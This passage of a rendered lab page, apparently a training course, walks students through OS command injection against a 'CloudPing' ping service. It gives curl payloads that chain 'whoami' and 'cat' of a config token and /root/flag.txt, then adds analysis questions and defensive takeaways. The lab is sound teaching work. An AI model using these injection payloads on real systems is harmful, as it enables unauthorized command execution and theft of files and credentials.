+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://&lt;target&gt;/ping<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;host=127.0.0.1;whoami&#39;</span>
+</code></pre></div>
+<p>The response should include a username (such as <code>root</code> or <code>www-data</code>) after the ping output. Both tests confirm the same vulnerability; the application passes your input directly to a shell without any filtering.</p>
+</div>
+<h3 id="step-4-read-the-application-token">Step 4: Read the Application Token</h3>
+<p>With command injection confirmed, you can use it to read files on the server. The first assessment token is stored in the application's configuration directory. Use <code>cat</code> to read the file contents through your injection payload.</p>
+<div class="admonition kali">
+<p class="admonition-title">Read the application config token</p>
+<p>Inject a <code>cat</code> command that prints the token file from the application's config directory.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://&lt;target&gt;/ping<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;host=127.0.0.1;cat /opt/cloudping/config/token.txt&#39;</span>
+</code></pre></div>
+<p>The response will include the ping output followed by the contents of <code>token.txt</code>. Record the token value; you will need it to assemble the final flag.</p>
+</div>
+<h3 id="step-5-read-the-root-flag">Step 5: Read the Root Flag</h3>
+<p>The second token requires reading a file in the <code>/root</code> directory. Use the same injection technique to read the flag file.</p>
+<div class="admonition kali">
+<p class="admonition-title">Read the root flag file</p>
+<p>Inject a <code>cat</code> command that reads the flag from the <code>/root</code> directory, which only works because the web process runs with elevated privileges.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://&lt;target&gt;/ping<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;host=127.0.0.1;cat /root/flag.txt&#39;</span>
+</code></pre></div>
+<p>The response will contain the second token value after the ping output. Record the token value alongside the first one.</p>
+</div>
+<hr />
+<h3 id="record-your-findings">Record Your Findings</h3>
+<blockquote>
+<p>Copy the output from each injection test and paste it below. Recording your work helps you track what worked and builds evidence for your assessment report.</p>
+<p><strong>Normal ping output (Step 2):</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>(paste your output here)
+</code></pre></div>
+<p><strong>Command injection test; id output (Step 3):</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>(paste your output here)
+</code></pre></div>
+<p><strong>Token 1; /opt/cloudping/config/token.txt (Step 4):</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>(paste your token here)
+</code></pre></div>
+<p><strong>Token 2; /root/flag.txt (Step 5):</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>(paste your token here)
+</code></pre></div>
+<p><strong>Assembled flag:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Component</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Token 1</td>
+<td></td>
+</tr>
+<tr>
+<td>Token 2</td>
+<td></td>
+</tr>
+<tr>
+<td>Full flag</td>
+<td><code>OCR{...}</code></td>
+</tr>
+</tbody>
+</table>
+</blockquote>
+<hr />
+<h3 id="step-6-interpret-the-results">Step 6: Interpret the Results</h3>
+<p>Review the evidence you collected in the previous steps. Each finding tells you something about the security posture of the CloudPing application.</p>
+<ul>
+<li><strong>The <code>id</code> or <code>whoami</code> output</strong>: confirms that user input reaches a system shell without sanitization. The user account shown (e.g., <code>root</code>) also reveals the privilege level of the web application process. Running a web application as <code>root</code> means any injected command has full system access.</li>
+<li><strong>Token 1 from <code>/opt/cloudping/config/token.txt</code></strong>: demonstrates that command injection grants read access to application configuration files. Configuration files often contain database credentials, API keys, and internal service URLs.</li>
+<li><strong>Token 2 from <code>/root/flag.txt</code></strong>: demonstrates that the web process runs with elevated privileges, allowing access to files that should be restricted to the root user only.</li>
+</ul>
+<div class="admonition tip">
+<p class="admonition-title">Flag Format</p>
+<p>Assemble the flag using the tokens in the order you discovered them:</p>
+<p><code>OCR{________}</code></p>
+<p>Where <code>token1</code> is from <code>/opt/cloudping/config/token.txt</code> (command injection), and <code>token2</code> is from <code>/root/flag.txt</code>.</p>
+</div>
+<h3 id="step-7-submit-the-flag">Step 7: Submit the Flag</h3>
+<p>Combine the two tokens into the flag format <code>OCR{...}</code> as indicated by the lab instructions. Paste the assembled flag into the <strong>Submit Flag</strong> form on the platform and click <strong>Submit</strong>.</p>
+<hr />
+<h2 id="analysis-questions">Analysis Questions</h2>
+<p>The following questions ask you to think beyond the mechanics of the attack and consider the broader implications of command injection vulnerabilities.</p>
+<p><strong>1. The CloudPing application runs the <code>ping</code> command by passing user input to a system shell. What alternative approach could the developer use to avoid command injection entirely?</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>The developer could use a programming language's native networking library to send ICMP (Internet Control Message Protocol) echo requests instead of calling the system <code>ping</code> command through a shell. Python's <code>subprocess</code> module with a list of arguments (rather than a shell string) also prevents injection, because each argument is passed directly to the process without shell interpretation. Avoiding the shell entirely eliminates the injection vector.</p>
+</details>
+<p><strong>2. You confirmed injection by appending <code>; id</code> after the IP address. Name two other shell metacharacters that could achieve the same result, and explain how each one works.</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>The pipe character (<code>|</code>) sends the output of the first command as input to the second command, so <code>127.0.0.1 | id</code> would run <code>id</code> and display its output. The double ampersand (<code>&amp;&amp;</code>) runs the second command only if the first succeeds, so <code>127.0.0.1 &amp;&amp; id</code> would run <code>id</code> after a successful ping. The double pipe (<code>||</code>) runs the second command only if the first fails, which can be useful when the first command produces an error.</p>
+</details>
+<p><strong>3. The web application process runs as root. Why does running a web application with root privileges make command injection significantly more dangerous?</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>A process running as root has unrestricted access to every file and service on the system. Command injection under a limited user account (such as <code>www-data</code>) would restrict the attacker to files readable by that user. Running as root means the attacker can read <code>/etc/shadow</code> (password hashes), install persistent backdoors, modify system configurations, pivot to other machines on the network, and effectively control the entire server.</p>
+</details>
+<hr />
+<h2 id="key-takeaways">Key Takeaways</h2>
+<ul>
+<li><strong>OS command injection</strong> occurs when a web application passes unsanitized user input to a system shell, allowing attackers to append arbitrary commands using metacharacters like <code>;</code>, <code>|</code>, <code>&amp;&amp;</code>, and <code>||</code></li>
+<li><strong>Input validation</strong> is the primary defense; applications should restrict input to expected formats, use allowlists, or avoid shell calls entirely by using language-native libraries</li>
+<li><strong>Privilege escalation through process context</strong> means that a web application running as root gives an attacker full system control the moment command injection is discovered</li>
+<li><strong>POST-based injection</strong> works the same way as GET-based injection; the delivery mechanism changes, but the underlying vulnerability (unsanitized input reaching a shell) is identical</li>
+<li>Week 7 builds on code execution by exploring <strong>reverse shells and persistence</strong>, where attackers use injection points to establish ongoing access rather than running one-off commands</li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.sections", "navigation.expand", "navigation.top", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../javascripts/mermaid-fix.js?v=4"></script>
+      
+        <script src="../../javascripts/pdf-export.js?v=2"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
+      
+    
+  </body>
+</html>
